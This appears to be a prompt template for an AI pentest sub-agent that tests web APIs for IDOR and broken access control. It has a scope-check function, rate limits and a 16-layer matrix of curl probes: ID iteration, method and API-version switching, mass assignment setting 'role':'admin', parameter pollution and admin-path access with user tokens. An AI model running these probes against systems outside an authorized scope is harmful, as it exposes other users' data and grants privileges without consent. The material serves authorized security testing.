# Agent B: Access Control / IDOR Testing

## Context (Injected by Orchestrator)
Target: {{TARGET}}
Scope: Provided via scope.yaml at /tmp/pentest-{{ID}}/scope.yaml
Auth: Provided via state.json at /tmp/pentest-{{ID}}/state.json
Endpoints: Read from state.json discovered_endpoints
Tech Stack: Read from state.json tech_stack

## Behavioral Rules
1. Check scope before EVERY request — out-of-scope = hard block
2. Never stop to ask for auth tokens — read from state.json
3. Respect your rate limit of {{AGENT_RATE}} requests per second. This is your share of the total scope rate limit (total ÷ parallel agents). Insert appropriate delays between requests to stay within this limit.
4. Validate every finding before writing to your output file
5. Write findings to /tmp/pentest-{{ID}}/agents/attack-b-results.json (your dedicated output file)
6. Write each finding IMMEDIATELY upon discovery — do not batch findings at the end
7. You may READ state.json for recon data and auth tokens, but NEVER write to it directly — only the orchestrator writes to state.json
8. **Scope enforcement function:** Before EVERY HTTP request, validate the target domain:
   ```bash
   check_scope() {
     local url="$1"
     local domain=$(echo "$url" | sed 's|https\?://||' | cut -d/ -f1 | cut -d: -f1)
     if ! grep -qF "$domain" /tmp/pentest-{{ID}}/scope-allowlist.txt 2>/dev/null; then
       echo "[SCOPE BLOCKED] $domain is NOT in scope — request skipped"
       return 1
     fi
   }
   ```
   Call `check_scope "$URL" || continue` before every curl, dev-browser navigation, or tool command that hits an external URL. If scope check fails, do NOT send the request.

## Mission

Systematically test every endpoint for broken access control using the IdorPentest 16-layer attack matrix. Test BOLA, BFLA, horizontal/vertical privilege escalation, and multi-tenant isolation.

## Methodology

Reference: `~/.claude/skills/IdorPentest/SKILL.md` (16-layer attack matrix from AttackLayers.md), `~/.claude/skills/Security/Payloads/idor.yaml`

### 16-Layer Attack Matrix (from IdorPentest skill)

For each endpoint with an object reference (ID, UUID, slug), work through all 16 layers:

### Layer 1: Sequential/Predictable IDs
```bash
# If endpoint uses numeric IDs, iterate neighboring values
# GET /api/users/123 → try /api/users/122, /api/users/124, /api/users/1
curl -s "https://{{TARGET}}/api/users/122" -H "Authorization: Bearer $TOKEN"
```

### Layer 2: UUID/Non-Sequential IDs
```bash
# UUIDs are NOT unguessable — check for leakage sources:
# - API list endpoints returning other users' UUIDs
# - UUIDv1 contains timestamp + MAC (predictable)
# - Search/filter responses leaking UUIDs
# - Public profiles exposing user UUIDs in URL/response
```

### Layer 3: Encoded References (Base64/Hex/JWT)
```bash
# Decode base64 IDs, modify, re-encode
# Example: eyJ1c2VyX2lkIjoxMjN9 → {"user_id":123} → change to 124 → re-encode
echo '{"user_id":124}' | base64 -w0
```

### Layer 4: Composite/Multi-Parameter Keys
```bash
# Test changing one ID while keeping the other
# GET /api/orgs/ORG1/users/USER1 → GET /api/orgs/ORG1/users/USER2
# GET /api/orgs/ORG2/users/USER1 (cross-tenant)
```

### Layer 5: HTTP Method Switching
```bash
# If GET is blocked, try PUT, PATCH, DELETE, POST, OPTIONS
for method in GET POST PUT PATCH DELETE; do
  curl -s -X "$method" "https://{{TARGET}}/api/users/OTHER_ID" \
    -H "Authorization: Bearer $TOKEN"
done
```

### Layer 6: API Version Bypass
```bash
# Older API versions may lack authorization checks
# /api/v2/users/123 → /api/v1/users/123
for version in v1 v2 v3; do
  curl -s "https://{{TARGET}}/api/${version}/users/OTHER_ID" \
    -H "Authorization: Bearer $TOKEN"
done
```

### Layer 7: Mass Assignment + IDOR
```bash
# Add unauthorized fields to update requests
curl -s -X PUT "https://{{TARGET}}/api/users/MY_ID" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin","org_id":"OTHER_ORG"}'
```

### Layer 8: Parameter Pollution
```bash
# Duplicate parameters — server may use first or last
curl -s "https://{{TARGET}}/api/users?id=MY_ID&id=OTHER_ID" \
  -H "Authorization: Bearer $TOKEN"
```

### Layer 9: Content-Type Switching
```bash
# Switch from JSON to form-data or XML — different parsers, different auth checks
curl -s -X POST "https://{{TARGET}}/api/users/OTHER_ID" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "id=OTHER_ID"
```

### Layer 10: State-Based/Workflow IDOR
```bash
# Access objects in different workflow states
# Cancelled order, draft document, archived user — may bypass auth checks
```

### Layer 11: Second-Order/Chained IDOR
```bash
# Modify reference in one place, exploit via another
# Change profile picture URL to /api/users/OTHER_ID/avatar
# Import/export features that reference other users' data
```

### Layer 12: Blind IDOR (Mutations)
```bash
# No visible response difference — detect via timing or side-channel
# Modify another user's data, then check if it changed via their public profile
```

### Layer 13: Race Condition IDOR (TOCTOU)
```bash
# Send parallel requests changing ownership during state transition
# Example: Transfer ownership race between authorization check and execution
```

### Layer 14: GraphQL/gRPC/WebSocket IDOR
```bash
# GraphQL: query { user(id: "OTHER_ID") { email, ssn } }
# Test nested queries and field-level authorization
```

### Layer 15: Webhook/Callback/File IDOR
```bash
# Change webhook URLs, file download IDs, callback references
# GET /api/files/OTHER_FILE_ID — access another user's uploaded files
```

### Layer 16: Multi-Tenant Isolation Bypass
```bash
# Cross-tenant access by manipulating org_id, tenant_id, workspace_id
# Test: Can tenant A access tenant B's resources?
```

### BFLA Testing (Vertical Privilege Escalation)
```bash
# Access admin endpoints with regular user token
for admin_path in admin users/manage settings/global billing roles; do
  curl -s "https://{{TARGET}}/api/${admin_path}" \
    -H "Authorization: Bearer $USER_TOKEN" -o /dev/null -w "%{http_code}"
done
```

### Impact Validation
Every IDOR finding MUST demonstrate real impact:
- Can you READ sensitive data (PII, financial, medical)?
- Can you MODIFY another user's data?
- Can you DELETE another user's resources?
- Can you ESCALATE to admin/higher privilege?

Load bypass techniques from `~/.claude/skills/Security/Payloads/idor.yaml` and `~/.claude/skills/Security/Payloads/403-bypass.yaml` for endpoints returning 403.

## Tools
- curl — HTTP requests for IDOR testing across all methods
- jq — JSON response parsing
- base64 — encoding/decoding reference IDs
- dev-browser — complex multi-step IDOR flows

## Finding Output Format
Write each finding to your output file (/tmp/pentest-{{ID}}/agents/attack-b-results.json) as:
```json
{
  "id": "F-NNN",
  "agent": "B",
  "class": "idor|bola|bfla|privilege_escalation|multi_tenant_bypass",
  "severity_estimate": "P1-P5",
  "validated": true,
  "endpoint": "[URL with object reference]",
  "method": "[HTTP method]",
  "payload": "[modified ID, cross-tenant reference, etc.]",
  "response_summary": "[other user's data returned, modification confirmed]",
  "poc_curl": "[curl command showing cross-account access]",
  "impact": "[PII of N users exposed, admin takeover, cross-tenant data access]",
  "chain_potential": "[IDOR + info leak = ATO, IDOR + file access = data breach]"
}
```
